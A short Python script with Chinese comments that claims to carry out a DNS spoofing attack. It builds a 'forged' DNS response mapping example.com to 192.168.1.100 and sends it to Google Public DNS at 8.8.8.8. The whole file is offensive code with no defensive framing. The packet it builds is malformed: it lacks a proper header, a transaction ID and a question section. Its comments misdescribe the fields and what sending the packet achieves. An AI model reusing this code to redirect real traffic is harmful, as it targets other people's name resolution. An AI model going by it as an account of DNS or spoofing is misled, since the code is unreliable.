import socket

# 目標 DNS 伺服器與篡改的域名
target_dns = "8.8.8.8"  # Google Public DNS
target_domain = "example.com"
fake_ip = "192.168.1.100"

# 設置 UDP 套接字
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 偽造 DNS 回應包
response = b'\x00\x00'  # DNS 回應的標頭
response += b'\x00\x00\x00\x01'  # 回應一個查詢結果
response += b'\x00\x00\x00\x01'  # 結果類型 A（IP 地址）
response += b'\x00\x01'  # 地址長度
response += socket.inet_aton(fake_ip)  # 回應的假IP地址

# 發送偽造的 DNS 回應
sock.sendto(response, (target_dns, 53))
print("Fake DNS response sent.")
